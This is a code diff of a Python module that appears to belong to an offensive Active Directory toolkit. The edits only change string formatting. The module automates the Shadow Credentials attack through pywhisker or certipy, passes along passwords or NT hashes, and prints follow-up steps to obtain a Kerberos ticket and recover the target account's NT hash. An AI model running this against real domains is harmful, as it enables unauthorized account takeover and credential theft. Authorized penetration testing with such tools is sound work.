@@ -1,5 +1,4 @@
-"""Shadow Credentials — abuse msDS-KeyCredentialLink for PKINIT auth."""
-from __future__ import annotations
+"""Shadow Credentials  -  abuse msDS-KeyCredentialLink for PKINIT auth."""
 import subprocess
 import sys
 import shutil
@@ -27,7 +26,7 @@ def run(args: Any) -> int:
         print("[!] --target-account required", file=sys.stderr)
         return 1
 
-    print("[*] Shadow Credentials: {} on {} ({})".format(action, target_account, dc_ip))
+    print(f"[*] Shadow Credentials: {action} on {target_account} ({dc_ip})")
 
     if shutil.which("pywhisker"):
         cmd = [
@@ -41,23 +40,22 @@ def run(args: Any) -> int:
         if cred.password:
             cmd.extend(["-p", cred.password])
         elif cred.has_hash:
-            cmd.extend(["--hashes", "{}:{}".format(cred.lm_hash, cred.nt_hash)])
+            cmd.extend(["--hashes", f"{cred.lm_hash}:{cred.nt_hash}"])
 
         result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
         print(result.stdout)
         if result.returncode == 0 and action == "add":
             print("\n[*] Next steps:")
             print("  1. Use the generated PFX + password with PKINITtools")
-            print("  2. gettgtpkinit.py -cert-pfx <pfx> -pfx-pass <pass> {}\\{} <ccache>".format(
-                args.domain, target_account))
+            print(f"  2. gettgtpkinit.py -cert-pfx <pfx> -pfx-pass <pass> {args.domain}\\{target_account} <ccache>")
             print("  3. export KRB5CCNAME=<ccache>")
-            print("  4. getnthash.py -key <AS-REP key> {}\\{}".format(args.domain, target_account))
+            print(f"  4. getnthash.py -key <AS-REP key> {args.domain}\\{target_account}")
         return result.returncode
 
     if shutil.which("certipy"):
         cmd = [
             "certipy", "shadow",
-            action, "-u", "{}@{}".format(cred.username, args.domain),
+            action, "-u", f"{cred.username}@{args.domain}",
             "-account", target_account,
             "-dc-ip", dc_ip,
         ]
